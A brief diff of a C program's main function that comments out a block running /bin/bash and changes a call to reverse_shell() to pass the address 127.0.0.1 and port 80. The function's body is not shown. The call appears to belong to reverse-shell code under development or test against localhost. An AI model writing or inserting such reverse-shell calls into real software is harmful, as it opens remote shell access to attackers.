@@ -6,10 +6,10 @@
 
 int main()
 {
+	/*
 	int i;
 	char *output;
 
-	/*
 	exec("/bin/bash", &output);
 
 	i = 0;
@@ -18,9 +18,9 @@ int main()
 		i++;
 	}*/
 
-	reverse_shell();
+	reverse_shell("127.0.0.1", 80);
 
-	free(output);
+	//free(output);
 
 	return 0;
 }
